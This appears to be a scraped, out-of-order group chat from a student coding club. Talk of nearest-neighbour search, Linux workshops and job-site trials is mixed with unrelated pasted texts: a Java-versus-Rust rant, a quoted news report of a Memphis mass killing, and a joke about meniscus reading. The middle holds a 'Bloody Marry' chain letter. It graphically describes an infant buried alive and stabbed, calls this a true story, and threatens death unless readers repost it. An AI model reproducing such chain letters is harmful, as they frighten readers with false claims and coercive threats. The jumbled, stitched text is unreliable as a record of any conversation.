<p>Which really isn't all that bad</p>
<p>The trivial solution is just O(m n)</p>
<p>https://en.wikipedia.org/wiki/Nearest_neighbor_search</p>
<p>I think Will was on to something tho</p>
<p>Yea exactly</p>
<p>well talk later lol</p>
<p>i might be understand the problem wrong</p>
<p>what kind of relationship?  If it's something like 'distance along x-axis' that's probably not telling enough to not check every point</p>
<p>The goal is to use some relationship between n's to be able to not have to do that yeah</p>
<p>the time complexity is horrible</p>
<p>yeah</p>
<p>So we'd have to calculate closeness for all of them?</p>
<p>but isn't it basically the algo assignment, but keep like heap of size m where you sort it based upon it's closeness?</p>
<p>But I definitely like the axis sorting that's a good idea</p>
<p>aaaayyyyyyyy</p>
<p>savage</p>
<p>Except Alex Terela</p>
<p>You don't need to dp anything</p>
<p>DP the shit out of it</p>
<p>Shrink the box as you go</p>
<p>You know everything inside a range is going to be a viable candidate</p>
<p>Also can sort in other axis to make a box</p>
<p>Then take a bunch of shit that's close enough to it</p>
<p>wait no never mind</p>
<p>Sort based on one axis</p>
<p>isn't that basically k-means?</p>
<p>N's *</p>
<p>But we can do pre processing on n'a</p>
<p>Oh, easy</p>
<p>M is just another set of points</p>
<p>For each m we want the closest n</p>
<p>What's each of another m points</p>
<p>Read what i said</p>
<p>This is not that problem</p>
<p>Just split it up into a bunch of partitions</p>

<p>Hey guys it's Alantutorial here with a new tutorial video, today I'm going to teach you guys how to use git</p>
<p>"Holy shit. My boss came into my corner in our open-plan office to tell me they had decided we were going to use Java for our next project and I literally screamed at her and hit the copy of 'Effective Java' out of her hand. She started yelling and swearing at me and I just put on my overpriced noise-cancelling headphones. I’m so distressed right now I don’t know what to do. I didn’t mean to do that to my boss but I’m literally in shock from the results of that meeting. I feel like I’m going to explode. Why the fucking fuck are we doing this? This can’t be happening. I’m having a fucking breakdown. I don’t want to believe the world is so 1x. I want a future to believe in. I want Rust to be mandatory for all projects and fix our broken core infrastructure. I cannot fucking deal with this right now. It wasn’t supposed to be like this, I thought the language was really popular on HN???? This is so fucked."</p>

<p>I'm so sorry. Keep reading on, or die tonight a exactly
12:42. This
is based on a TRUE STORY! Once there
was
a baby
girl named Marry. Her mother couldn't
take
all the
crying, so she decided it was time for her
to
go. She
buried her baby alive in her back yard.
After she
buried her she could still hear Marry
crying.
So she dug her back up and stabbed her
one
time in the arm,
and buried her again. Marry cried harder,
but a few
hours later it stopped. At exactly 12:42,
Marry died.
She bleed to death. Now her sprite
haunts
the
world. When your sleeping, she stabs
you in
the
arm and watches you bleed to death.
And
that's how she got the name "Bloody
Marry" this is the true story
of her. She wants everyone to feel her
pain
that she
felt. Apparently, if you re-post This isn't
fake.
Apparently, if you copy and paste this to
ten
comments in the next ten minuets you
will
have the
best day of your life tomorrow. You will
either get kissed or asked out, if you
brake
this chain you will
see a little dead girl in your room tonight.
In the next
53 minuets someone will say I love you
or
I'm sorry
to 12 other comments you will have the
best day of
your life tomorrow. But if you break this
chain you die
at exactly 12:42 tonight by Bloody Marry</p>

<p>Yeah</p>
<p>Have we gone over javascript at all?</p>
<p>After they all move we could do a workshop on some web technology, maybe introduce them to the idea of the mean stack or something. Not actually go over how to implement everything, but more of an overview of everything</p>
<p>I think it'd be pretty cool if we intro'd with a linux install guide and the asked people who want to get it done go to a specific part of the room</p>
<p>v excite</p>
<p>oh damn</p>
<p>That's all</p>
<p>And we should talk about strategy going forward for web</p>
<p>They've got git on lock</p>
<p>any ideas on what we should do this Thursday?</p>
<p>Damn bruh</p>
<p>ah gotcha lol</p>
<p>Hey man, I agree with you lmao. I meant hackbu as a whole should do a linux installation workshop</p>
<p>Not sure what we're doing this week. And sorry Austin, if anyone is gonna give a talk on linux installation, it's probably gonna be Will lol</p>
<p>Yea it's not a bad idea. And Erik and I have to talk about it</p>
<p>What's the next workshop we're doing?</p>
<p>I'd like to do a linux install workshop</p>
<p>Not great package support</p>
<p>Freebsd is kinda meh</p>
<p>do we use any advanced operating systems like freebsd</p>

<p>"Upon responding to a call from a woman concerned about her son and his father, Memphis police discovered six individuals murdered and three seriously injured in the home. Among these victims, the three seriously injured and one of the dead were children. Autopsy determined that the adult victims had been shot multiple times with a semi-automatic weapon and the children had been stabbed multiple times and received blunt trauma to the head."</p>

<p>Few people take the time to consider the importance of a water meniscus in their lives. But, imagine this chilling scenario:

In your high-school chemistry final exam you mistakenly read a meniscus as 72 milliliters (ml) instead of the correct 66 ml (in this picture), and thus you get an 89 on the test instead of a 90. Your GPA falls from 4.00 to 3.99 and you don't get into that Engineering college program you wanted. Consequently, you don't get that prestigious engineering job, where, 20 years later, you would have invented a new water-based chemical to allow rubber to grip better. Sadly, 10 years later, a mother and her adorable 4-year old daughter are leaving the ice cream store and the little girl, whose shoes don't have your un-invented coating, slips on a napkin and drops her ice cream cone. She cries at her loss ... because you misread the meniscus in the 12th grade.</p>

<p>they ar ejust saying buy / try premium to bump up your application</p>

<p>If they offer to me when I apply then I think that's ok</p>
<p>Yeah but let's say I used my trial</p>
<p>It's a trial period</p>
<p>They give free to anyone regardless</p>
<p>Oh wait do they give free to anyone who apply tho</p>
